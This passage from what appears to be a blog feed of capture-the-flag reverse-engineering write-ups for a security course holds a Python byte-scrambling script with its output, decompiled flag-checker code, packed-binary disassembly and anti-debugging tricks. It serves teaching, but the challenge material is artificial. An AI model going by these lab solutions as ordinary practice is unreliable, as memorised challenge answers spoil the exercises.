░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░░░░░░░░ \x00\x00 ░░ "); puts(&amp;icon[6760]); return 0LL; } :::</description></item><item><title>Simple Reverse - 0x27(2023 Lab - Scramble)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/index.html</guid><description>Simple Reverse - 0x27(2023 Lab - Scramble) Source code :::spoiler scramble.py
import random def generate_scramble_pattern(pattern_length, max_shift, max_add_sub): scramble_pattern = [] for _ in range(random.randint(1, pattern_length)): operation = random.randint(0, 3) if operation == 0: sub_value = random.randint(1, max_add_sub) elif operation == 1: add_value = random.randint(1, max_add_sub) scramble_pattern.append(('add', add_value)) elif operation == 2: sub_value = random.randint(1, max_add_sub) scramble_pattern.append(('sub', sub_value)) elif operation == 3: shift_value = random.randint(1, max_shift) scramble_pattern.append(('lsh', shift_value)) return scramble_pattern def apply_scramble_pattern(input_bytes, patterns): result = [] for i, operations in enumerate(patterns): src = input_bytes[i] for operation in operations: if operation is None: continue elif operation[0] == 'add': src += operation[1] elif operation[0] == 'sub': src -= operation[1] elif operation[0] == 'lsh': src &lt;&lt;= operation[1] src &amp;= 0xffffffff result.append(src) return result k_FLAG = b'FLAG{REDACTED}' patterns = [generate_scramble_pattern(6, max_shift=10, max_add_sub=0xffff) for i in range(len(k_FLAG)) ] scrambled_result = apply_scramble_pattern(k_FLAG, patterns) print("Input Bytes:", k_FLAG, len(k_FLAG)) # REDACTED, 42 print("Scramble Pattern:", patterns) # [[('sub', 20935)], [('sub', 31575), ('lsh', 9), ('add', 45363), ('add', 35372), ('sub', 15465)], [('add', 19123), ('add', 35260), ('sub', 49421), ('lsh', 8)], [('lsh', 1), ('sub', 4977), ('sub', 55837)], [('add', 16937)], [('sub', 56984), ('lsh', 2), ('sub', 32363), ('sub', 46293)], [('sub', 94), ('sub', 48860), ('sub', 18342), ('lsh', 3)], [('add', 37549), ('sub', 36283), ('lsh', 6), ('add', 6253)], [('add', 34661), ('sub', 13281), ('sub', 64107)], [('sub', 8525), ('sub', 30349), ('sub', 26744)], [('lsh', 2), ('sub', 18120), ('sub', 63091), ('add', 17287), ('sub', 37618), ('add', 2237)], [('sub', 48573), ('sub', 4449), ('add', 36013), ('sub', 64051)], [('add', 10415), ('lsh', 3), ('lsh', 10)], [('add', 5676), ('lsh', 3), ('lsh', 10), ('add', 32002), ('sub', 60775)], [('add', 35939), ('sub', 32666), ('sub', 45639), ('add', 2077), ('sub', 16253)], [('sub', 30392), ('sub', 26913), ('sub', 14009), ('sub', 62416)], [('sub', 15056), ('sub', 40527)], [('lsh', 5)], [('lsh', 1), ('sub', 16070)], [('add', 2045)], [('lsh', 8), ('add', 37087), ('sub', 22013), ('lsh', 10), ('lsh', 2)], [('add', 31880), ('sub', 56557), ('lsh', 6), ('lsh', 5), ('lsh', 8), ('add', 15535)], [('add', 22937), ('add', 4060)], [('add', 8462), ('sub', 4463), ('sub', 45810), ('lsh', 1)], [('sub', 10144), ('lsh', 8), ('lsh', 5), ('lsh', 1), ('lsh', 8)], [('add', 49937), ('lsh', 2), ('add', 60982), ('sub', 24799)], [('lsh', 4), ('add', 53340), ('add', 50619), ('sub', 56111), ('add', 6134), ('lsh', 1)], [('sub', 22577), ('sub', 50645)], [('add', 21265), ('sub', 41440)], [('add', 63314), ('sub', 45755), ('add', 62216)], [('sub', 52616)], [('add', 21192)], [('add', 62573), ('sub',18811)], [('add', 35452), ('sub', 11573), ('sub', 49079), ('sub', 36361), ('sub', 26862), ('lsh', 9)], [('add', 13610), ('lsh', 7), ('lsh', 3), ('sub', 28490), ('lsh', 10), ('add', 44742)], [('lsh', 10), ('sub', 1797), ('sub', 10564), ('add', 12394)], [('add', 45165), ('lsh', 10), ('sub', 60610), ('sub', 63002), ('sub', 14851), ('lsh', 1)], [('add', 34840), ('lsh', 3), ('sub', 16907)], [('add', 4404), ('lsh', 3), ('lsh', 7), ('lsh', 6)], [('lsh', 6), ('add', 51738), ('sub', 24621), ('add', 58646)], [('lsh', 1)], [('add', 29375), ('sub', 419), ('add', 2854), ('sub', 11878), ('lsh', 10), ('add', 40151)], [('add', 22953)]] print("Scrambled Result:", scrambled_result) # [4294946431, 4278905078, 1286912, 4294906624, 17060, 4294661164, 4294429720, 94573, 4294924666, 4294901787, 4294868383, 4294886344, 86147072, 47247259, 4294910851, 4294833676, 4294911813, 3040, 4294951460, 2160, 171843584, 4734127, 27100, 4294883864, 884998144, 236375, 111420, 4294894192, 4294947222, 79889, 4294914775, 21308, 43873, 4249743360, 1477674694, 113697, 92442178, 262757, 295239680, 91843, 210, 20569303, 23078] ::: :::spoiler output.txt</description></item><item><title>Simple Reverse - 0x28(2023 Lab - Super Angry)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/index.html</guid><description>Simple Reverse - 0x28(2023 Lab - Super Angry) Source code :::spoiler main function
__int64 __fastcall main(int argc, char **argv, char **a3) { __int64 *user_input; // rcx __int64 v5; // rdx __int64 v6; // rdx char output[128]; // [rsp+10h] [rbp-B0h] BYREF __int64 user_input_cp[6]; // [rsp+90h] [rbp-30h] BYREF user_input_cp[5] = __readfsqword(0x28u); if ( argc == 2 ) { user_input = (__int64 *)argv[1]; v5 = user_input[1]; user_input_cp[0] = *user_input; user_input_cp[1] = v5; v6 = user_input[3]; user_input_cp[2] = user_input[2]; user_input_cp[3] = v6; scramble_fn((__int64)user_input_cp, output, 0x20uLL); if ( !memcmp(output, verify_key, 0x80uLL) ) puts("Correct!"); else puts("Incorrect!"); return 0LL; } else { printf("Usage: %s &lt;input>\n", *argv); return 1LL; } } :::</description></item><item><title>Simple Reverse - 0x29(2023 Lab - Unpackme)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/index.html</guid><description>Simple Reverse - 0x29(2023 Lab - Unpackme) Source code ... LOAD:0000000000005AE8 mov rdi, [rsp+18h+start] ; start LOAD:0000000000005AED push 5 LOAD:0000000000005AEF pop rdx ; prot LOAD:0000000000005AF0 push 0Ah LOAD:0000000000005AF2 pop rax LOAD:0000000000005AF3 syscall ; LINUX - sys_mprotect LOAD:0000000000005AF5 jmp r13 LOAD:0000000000005AF5 LOAD:0000000000005AF5 sub_5A7C endp LOAD:0000000000005AF5 LOAD:0000000000005AF8 ; --------------------------------------------------------------------------- LOAD:0000000000005AF8 LOAD:0000000000005AF8 loc_5AF8: ; CODE XREF: start+2↑p LOAD:0000000000005AF8 pop rbp LOAD:0000000000005AF9 call sub_5A7C LOAD:0000000000005AF9 LOAD:0000000000005AF9 ; --------------------------------------------------------------------------- LOAD:0000000000005AFE aProcSelfExe db '/proc/self/exe',0 LOAD:0000000000005B0D align 2 LOAD:0000000000005B0E dw 1 LOAD:0000000000005B10 dq 81B00000C1100h, 0FFFFFF0000000200h, 7549F983004AE8E5h, 0FD374C8D48575344h, 0CE39482FEB5B565Eh, 0FFFFFBFF5E563273h LOAD:0000000000005B10 dq 778F3C0A72803CACh, 2C06740FFE7E8006h, 56161BE477013CE8h, 0FFBFFFFF75D028ADh, 0D801F829C80F5FDFh, 0C35BDFEBAC0312ABh LOAD:0000000000005B10 dq 8948505741564158h, 0DBFFEDFEEC8148E6h, 590A6A5F54591000h, 5003E8348A548F3h, 0B6AB48FE8949F875h, 0F60C0AFC0CCBB374h LOAD:0000000000005B10 dq 4DF5FF6EDFFE02FFh, 5E57370FFFBAFC29h, 50F58596AED7B8Ch, 0DFFF6FDB0579C085h, 8D49FD91580F6A0Eh, 0E741AAA00B0FF7Dh ... :::spoiler Real File main Function</description></item><item><title>Simple Reverse - 0x30(2023 HW - Evil FlagChecker)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/index.html</guid><description>Simple Reverse - 0x30(2023 HW - Evil FlagChecker) Background Anti Disassembly - 這一部分可以看一下碩一修的malware reverse的anti disassembly的修復(就是d和c的交錯使用) Anti Debugging - 首推scylla hide
Source code :::spoiler IDA main
int __cdecl main(int argc, const char **argv, const char **envp) { DWORD TickCount; // [esp+0h] [ebp-14h] unsigned int v5; // [esp+8h] [ebp-Ch] TickCount = GetTickCount(); Sleep(120000u); v5 = GetTickCount() - TickCount; if ( v5 &lt; 119950 || v5 > 120050 ) ExitProcess(0); ((void (*)(void))loc_401AE0)(); return 0; } ::: :::spoiler IDA loc_401AE0
.text:00401AE0 loc_401AE0: ; CODE XREF: _main:loc_4014AB↑p .text:00401AE0 push ebp .text:00401AE1 mov ebp, esp .text:00401AE3 lea esi, aHelloHacker ; "Hello Hacker" .text:00401AE9 mov al, 48h ; 'H' .text:00401AEB cmp [esi], al .text:00401AED jz short loc_401AF0 .text:00401AED .text:00401AED ; --------------------------------------------------------------------------- .text:00401AEF db 0E8h .text:00401AF0 ; --------------------------------------------------------------------------- .text:00401AF0 .text:00401AF0 loc_401AF0: ; CODE XREF: .text:00401AED↑j .text:00401AF0 nop word ptr [eax+eax+00000000h] .text:00401AF9 jmp short loc_401B01 .text:00401AF9 .text:00401AF9 ; --------------------------------------------------------------------------- .text:00401AFB db 48h ; H .text:00401AFC db 65h ; e .text:00401AFD db 6Ch ; l .text:00401AFE db 6Ch ; l .text:00401AFF db 6Fh ; o .text:00401B00 db 0 .text:00401B01 ; --------------------------------------------------------------------------- .text:00401B01 .text:00401B01 loc_401B01: ; CODE XREF: .text:00401AF9↑j .text:00401B01 jmp short loc_401B0E .text:00401B01 .text:00401B01 ; --------------------------------------------------------------------------- .text:00401B03 db 0E8h .text:00401B04 db 66h ; f .text:00401B05 db 0Fh .text:00401B06 db 1Fh .text:00401B07 db 84h .text:00401B08 db 0 .text:00401B09 db 0 .text:00401B0A db 0 .text:00401B0B db 0 .text:00401B0C byte_401B0C db 0 .text:00401B0D db 0E8h .text:00401B0E ; --------------------------------------------------------------------------- .text:00401B0E .text:00401B0E loc_401B0E: ; CODE XREF: .text:loc_401B01↑j .text:00401B0E jz short loc_401B13 .text:00401B0E .text:00401B10 jnz short loc_401B13 .text:00401B10 .text:00401B10 ; --------------------------------------------------------------------------- .text:00401B12 db 0E8h .text:00401B13 ; --------------------------------------------------------------------------- .text:00401B13 .text:00401B13 loc_401B13: ; CODE XREF: .text:loc_401B0E↑j .text:00401B13 ; .text:00401B10↑j .text:00401B13 push 1 .text:00401B15 jmp sub_401220 ::: :::spoiler IDA notify_debugger</description></item><item><title>Simple Reverse 0x06(Lab - AMessageBox)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/index.html</guid><description>Simple Reverse 0x06(Lab - AMessageBox) Background 組合語言ROL和RCL的區別
Recon 這一題其實以逆向的角度來說很簡單
